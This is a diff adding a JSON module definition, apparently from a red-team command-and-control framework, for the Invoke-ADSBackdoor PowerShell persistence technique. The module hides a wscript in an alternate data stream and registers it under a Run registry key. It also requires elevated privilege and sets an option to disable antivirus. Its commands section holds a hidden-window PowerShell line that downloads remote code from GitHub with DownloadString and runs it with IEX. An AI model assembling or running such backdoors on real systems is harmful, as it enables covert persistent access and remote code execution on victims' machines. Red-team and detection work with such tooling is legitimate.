@@ -1,0 +1,37 @@
+{
+    "base": {
+      "type": "standard",
+      "name": "Invoke-ADSBackdoor",
+      "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+      "credits": ["Matt Nelson (@enigma0x3)"],
+      "path": ["windows", "x64", "powershell", "persistence", "Invoke-ADSBackdoor.json"],
+      "platform": "windows",
+      "arch": "x64",
+      "lang": "PowerShell",
+      "privilege": true,
+      "notes": "https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/",
+      "remote": "https://raw.githubusercontent.com/enigma0x3/Invoke-AltDSBackdoor/master/Invoke-ADSBackdoor.ps1",
+      "local": ["data", "src", "enigma0x3", "Invoke-ADSBackdoor.ps1"],
+      "options": [
+        {"name": "URL", "value": null, "required": true, "flag": "-URL", "description":"The url of the powershell script you want to store"},
+        {"name": "Arguments", "value": null, "required": false, "flag": "-Arguments", "description":"The full syntax to running the powershell script"}
+      ],
+      "description": "Creates a wscript in an alternate datastream that is used to call the url with arguments via a currentversion\run registry key",
+      "commands": [
+        "powershell.exe",
+        "-nop",
+        "-w",
+        "0",
+        "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Invoke-AltDSBackdoor/master/Invoke-ADSBackdoor.ps1');",
+        "Invoke-ADSBackdoor",
+        "{{URL}}",
+        "{{Arguments.Flag}}",
+        "\""
+      ]
+    },
+    "powershell": {
+      "disableav": true,
+      "obfuscate": false,
+      "base64": false
+    }
+  }
